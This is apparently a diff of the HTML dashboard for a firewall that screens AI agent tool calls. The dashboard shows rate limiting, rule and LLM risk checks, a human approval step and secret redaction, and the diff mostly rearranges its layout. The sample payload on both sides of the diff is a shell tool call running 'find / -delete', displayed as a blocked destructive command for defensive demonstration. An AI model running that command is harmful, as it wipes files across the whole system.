+        <div class="pipeline-flow">
+          <div class="pipe-node" id="node-agent" title="Client sending JSON-RPC tool call">
+            <div class="node-icon">🤖</div>
+            <div class="node-name">AI Agent</div>
+            <div class="node-role">Client (Cursor/Claude)</div>
+          </div>
+          <div class="flow-arrow" id="arr-1">➔</div>
+
+          <div class="pipe-node" id="node-rate" title="Continuous token bucket rate limiter">
+            <div class="node-icon">⏱️</div>
+            <div class="node-name">Rate Limiter</div>
+            <div class="node-role">Token Bucket</div>
+          </div>
+          <div class="flow-arrow" id="arr-2">➔</div>
+
+          <div class="pipe-node" id="node-tier0" title="Pure in-memory Go regex &amp; deny-by-default rules (&lt;0.1ms)">
+            <div class="node-icon">🛡️</div>
+            <div class="node-name">Tier 0 Policy</div>
+            <div class="node-role">Regex &amp; Rules</div>
+          </div>
+          <div class="flow-arrow" id="arr-3">➔</div>
+
+          <div class="pipe-node" id="node-judge" title="Semantic LLM / Risk scoring engine">
+            <div class="node-icon">🧠</div>
+            <div class="node-name">Tier 1 Judge</div>
+            <div class="node-role">Semantic LLM</div>
+          </div>
+          <div class="flow-arrow" id="arr-4">➔</div>
+
+          <div class="pipe-node" id="node-router" title="Routes verdict: Block, Needs Approval (HITL), or Allow">
+            <div class="node-icon">🔀</div>
+            <div class="node-name">3-Way Router</div>
+            <div class="node-role">Allow/Review/Block</div>
+          </div>
+          <div class="flow-arrow" id="arr-5">➔</div>
+
+          <div class="pipe-node" id="node-redact" title="Recursive AST secret scrubber for tokens and passwords">
+            <div class="node-icon">🕶️</div>
+            <div class="node-name">Redactor</div>
+            <div class="node-role">AST Key Scrubber</div>
+          </div>
+          <div class="flow-arrow" id="arr-6">➔</div>
+
+          <div class="pipe-node" id="node-server" title="Real MCP Tool child process">
+            <div class="node-icon">⚙️</div>
+            <div class="node-name">Tool Server</div>
+            <div class="node-role">Child Process</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Bottom Left: Live Decision Inspector -->
+      <div class="card-panel inspector-card">
+        <div class="inspector-header">
+          <div style="font-weight: 700; font-size: 14px; display: flex; align-items: center; gap: 8px;">
+            <span>Active Interception Decision:</span>
+            <span id="bd-tool-badge" style="font-family: var(--font-mono); color: var(--primary);">shell</span>
+          </div>
+          <span class="verdict-badge block" id="bd-verdict">BLOCKED</span>
+        </div>
+
+        <div class="breakdown-grid">
+          <div class="breakdown-item">
+            <span class="item-lbl">Tier 0 Check</span>
+            <span class="item-val" id="bd-tier0">Passed</span>
+          </div>
+          <div class="breakdown-item">
+            <span class="item-lbl">Risk Score</span>
+            <span class="item-val" id="bd-score" style="color: var(--red-bright);">0.95</span>
+          </div>
+          <div class="breakdown-item">
+            <span class="item-lbl">Threat Category</span>
+            <span class="item-val" id="bd-cat" style="color: var(--amber-bright);">Destructive</span>
+          </div>
+          <div class="breakdown-item">
+            <span class="item-lbl">Redaction</span>
+            <span class="item-val" id="bd-redact">Clean</span>
+          </div>
+        </div>
+
+        <div class="rationale-box" id="bd-rationale">
+          Select or type a command above and click "Execute Real Go Firewall" to evaluate the payload live in Go memory.
+        </div>
+
+        <!-- HITL Confirmation Box -->
+        <div class="hitl-box" id="hitl-panel">
+          <div style="font-size: 12px; color: #fbbf24; font-weight: 600;">
+            ⚠️ Operator Confirmation Required (Risk: 0.55)
+          </div>
+          <div style="display: flex; gap: 8px;">
+            <button class="btn-hitl" style="background:#10b981; color:#041019;" onclick="resolveHITL(true)">Approve</button>
+            <button class="btn-hitl" style="background:#f43f5e; color:#fff;" onclick="resolveHITL(false)">Deny</button>
+          </div>
+        </div>
+
+        <!-- JSON-RPC Frame Viewer -->
+        <div class="code-viewer">
+          <div class="code-viewer-head">
+            <span>MCP JSON-RPC EVALUATION PAYLOAD (GO BACKEND)</span>
+            <span id="bd-id">ID: eval-ready</span>
+          </div>
+          <pre class="code-viewer-body" id="bd-json">{"jsonrpc":"2.0","method":"tools/call","params":{"name":"shell","arguments":{"cmd":"find / -delete"}}}</pre>
+        </div>
+      </div>
+
     </div>
 
-    <!-- 2D Pipeline Nodes -->
-    <div class="pipeline-flow">
-      <div class="pipe-node" id="node-agent" title="Client sending JSON-RPC tool call">
-        <div class="node-icon">🤖</div>
-        <div class="node-name">AI Agent</div>
-        <div class="node-role">Client (Cursor/Claude)</div>
-      </div>
-      <div class="flow-arrow" id="arr-1">➔</div>
+    <!-- RIGHT COLUMN: Metrics Grid & Live Telemetry Stream -->
+    <div class="col-right">
 
-      <div class="pipe-node" id="node-rate" title="Continuous token bucket rate limiter">
-        <div class="node-icon">⏱️</div>
-        <div class="node-name">Rate Limiter</div>
-        <div class="node-role">Token Bucket</div>
-      </div>
-      <div class="flow-arrow" id="arr-2">➔</div>
-
-      <div class="pipe-node" id="node-tier0" title="Pure in-memory Go regex &amp; deny-by-default rules (&lt;0.1ms)">
-        <div class="node-icon">🛡️</div>
-        <div class="node-name">Tier 0 Policy</div>
-        <div class="node-role">Regex &amp; Rules</div>
-      </div>
-      <div class="flow-arrow" id="arr-3">➔</div>
-
-      <div class="pipe-node" id="node-judge" title="Semantic LLM / Risk scoring engine">
-        <div class="node-icon">🧠</div>
-        <div class="node-name">Tier 1 Judge</div>
-        <div class="node-role">Semantic LLM</div>
-      </div>
-      <div class="flow-arrow" id="arr-4">➔</div>
-
-      <div class="pipe-node" id="node-router" title="Routes verdict: Block, Needs Approval (HITL), or Allow">
-        <div class="node-icon">🔀</div>
-        <div class="node-name">3-Way Router</div>
-        <div class="node-role">Allow/Review/Block</div>
-      </div>
-      <div class="flow-arrow" id="arr-5">➔</div>
-
-      <div class="pipe-node" id="node-redact" title="Recursive AST secret scrubber for tokens and passwords">
-        <div class="node-icon">🕶️</div>
-        <div class="node-name">Redactor</div>
-        <div class="node-role">AST Key Scrubber</div>
-      </div>
-      <div class="flow-arrow" id="arr-6">➔</div>
-
-      <div class="pipe-node" id="node-server" title="Real MCP Tool child process">
-        <div class="node-icon">⚙️</div>
-        <div class="node-name">Tool Server</div>
-        <div class="node-role">Child Process</div>
-      </div>
-    </div>
-  </div>
-
-  <!-- Metric Strip -->
-  <div class="metrics-strip">
-    <div class="metric-box">
-      <span class="metric-lbl">Total Interceptions</span>
-      <span class="metric-val" id="cnt-total">0</span>
-    </div>
-    <div class="metric-box ok">
-      <span class="metric-lbl">Passed / Allowed</span>
-      <span class="metric-val" id="cnt-allowed" style="color: var(--green-bright);">0</span>
-    </div>
-    <div class="metric-box bad">
-      <span class="metric-lbl">Blocked Threats</span>
-      <span class="metric-val" id="cnt-blocked" style="color: var(--red-bright);">0</span>
-    </div>
-    <div class="metric-box purple">
-      <span class="metric-lbl">Secrets Redacted</span>
-      <span class="metric-val" id="cnt-redacted" style="color: var(--purple-bright);">0</span>
-    </div>
-    <div class="metric-box warn">
-      <span class="metric-lbl">Engine Latency</span>
-      <span class="metric-val" id="cnt-latency" style="color: var(--amber-bright);">&lt; 0.5ms</span>
-    </div>
-  </div>
-
-  <!-- Main Split Area (Height-Bounded Workspace) -->
-  <div class="main-split">
-
-    <!-- Left: Decision Inspector -->
-    <div class="inspector-card">
-      <div class="inspector-header">
-        <div style="font-weight: 700; display: flex; align-items: center; gap: 8px;">
-          <span>Active Decision:</span>
-          <span id="bd-tool-badge" style="font-family: var(--font-mono); color: var(--primary);">shell</span>
-          <span style="font-size: 10.5px; color: var(--text-dim);" id="bd-latency-tag">(Real Go Backend Execution)</span>
+      <!-- Top Right: 2x2 Key Metric Tiles (Moved UP into prominent position) -->
+      <div class="metrics-grid">
+        <div class="metric-card">
+          <span class="metric-lbl">Total Interceptions</span>
+          <span class="metric-val" id="cnt-total">0</span>
         </div>
-        <span class="verdict-badge block" id="bd-verdict">BLOCKED</span>
-      </div>
-
-      <div class="breakdown-grid">
-        <div class="breakdown-item">
-          <span class="item-lbl">Tier 0 Check</span>
-          <span class="item-val" id="bd-tier0">Passed</span>
+        <div class="metric-card bad">
+          <span class="metric-lbl">Blocked Threats</span>
+          <span class="metric-val" id="cnt-blocked" style="color: var(--red-bright);">0</span>
         </div>
-        <div class="breakdown-item">
-          <span class="item-lbl">Risk Score</span>
-          <span class="item-val" id="bd-score" style="color: var(--red-bright);">0.95</span>
+        <div class="metric-card ok">
+          <span class="metric-lbl">Passed / Allowed</span>
+          <span class="metric-val" id="cnt-allowed" style="color: var(--green-bright);">0</span>
         </div>
-        <div class="breakdown-item">
-          <span class="item-lbl">Threat Class</span>
-          <span class="item-val" id="bd-cat" style="color: var(--amber-bright);">Destructive</span>
-        </div>
-        <div class="breakdown-item">
-          <span class="item-lbl">Redaction</span>
-          <span class="item-val" id="bd-redact">Clean</span>
+        <div class="metric-card purple">
+          <span class="metric-lbl">Secrets Redacted</span>
+          <span class="metric-val" id="cnt-redacted" style="color: var(--purple-bright);">0</span>
         </div>
       </div>
 
-      <div class="rationale-box" id="bd-rationale">
-        Select or type a command above and click "Execute Against Real Go Firewall" to evaluate the payload live in Go memory.
-      </div>
-
-      <!-- HITL Confirmation Box -->
-      <div class="hitl-box" id="hitl-panel">
-        <div style="font-size: 11px; color: #fbbf24; font-weight: 600;">
-          ⚠️ Operator Confirmation Required (Risk: 0.55)
+      <!-- Bottom Right: Live Telemetry Audit Feed -->
+      <div class="card-panel telemetry-card">
+        <div class="telemetry-head">
+          <span class="card-title">Live Telemetry Audit Feed</span>
+          <div class="feed-filters">
+            <button class="filter-btn active" onclick="filterFeed('all')">All</button>
+            <button class="filter-btn" onclick="filterFeed('blocked')">Blocked</button>
+            <button class="filter-btn" onclick="filterFeed('redacted')">Redacted</button>
+            <button class="filter-btn" onclick="filterFeed('response')">Allowed</button>
+          </div>
         </div>
-        <div style="display: flex; gap: 6px;">
-          <button class="btn-hitl" style="background:#10b981; color:#041019;" onclick="resolveHITL(true)">Approve</button>
-          <button class="btn-hitl" style="background:#f43f5e; color:#fff;" onclick="resolveHITL(false)">Deny</button>
-        </div>
-      </div>
 
-      <!-- JSON-RPC Frame Viewer -->
-      <div class="code-viewer">
-        <div class="code-viewer-head">
-          <span>MCP JSON-RPC EVALUATION PAYLOAD (GO BACKEND)</span>
-          <span id="bd-id">ID: eval-ready</span>
-        </div>
-        <pre class="code-viewer-body" id="bd-json">{"jsonrpc":"2.0","method":"tools/call","params":{"name":"shell","arguments":{"cmd":"find / -delete"}}}</pre>
-      </div>
-    </div>
-
-    <!-- Right: Telemetry Stream -->
-    <div class="telemetry-card">
-      <div class="telemetry-head">
-        <span style="font-weight: 800; font-family: var(--font-head); font-size: 13px;">Live Telemetry Audit Feed</span>
-        <div class="feed-filters">
-          <button class="filter-btn active" onclick="filterFeed('all')">All</button>
-          <button class="filter-btn" onclick="filterFeed('blocked')">Blocked</button>
-          <button class="filter-btn" onclick="filterFeed('redacted')">Redacted</button>
-          <button class="filter-btn" onclick="filterFeed('response')">Allowed</button>
+        <div class="telemetry-table" id="feed-container">
+          <!-- Live stream rows arrive via SSE -->
         </div>
       </div>
 
-      <div class="telemetry-table" id="feed-container">
-        <!-- Live stream rows arrive via SSE -->
-      </div>
     </div>
 
   </div>
@@ -1016,8 +1011,7 @@
     
     // Real Go backend latency display
     const latUs = res.total_latency_us || 42;
-    document.getElementById('bd-latency-tag').textContent = `(Real Go latency: ${latUs}µs / ${(latUs/1000).toFixed(3)}ms)`;
-    document.getElementById('cnt-latency').textContent = latUs < 1000 ? `${latUs}µs` : `${(latUs / 1000).toFixed(2)}ms`;
+    document.getElementById('bd-latency-tag').textContent = `⚡ Engine Latency: ${latUs}µs (${(latUs/1000).toFixed(3)}ms)`;
 
     document.getElementById('hitl-panel').style.display = res.route === 'needs_approval' ? 'flex' : 'none';
 
@@ -1110,12 +1104,12 @@
         argsStr = e.decision;
       }
       row.innerHTML = `
-        <div style="display:flex; align-items:center; gap:6px; overflow:hidden;">
+        <div style="display:flex; align-items:center; gap:8px; overflow:hidden;">
           <span class="feed-tag ${e.kind}">${e.kind}</span>
           <span class="feed-tool">${escapeHTML(e.tool || 'gate')}</span>
           <span class="feed-args">${escapeHTML(argsStr)}</span>
         </div>
-        <div style="font-family:var(--font-mono); font-size:9.5px; color:var(--text-dim); white-space:nowrap;">
+        <div style="font-family:var(--font-mono); font-size:10.5px; color:var(--text-dim); white-space:nowrap;">
           <span>${timeStr}</span>
         </div>
       `;
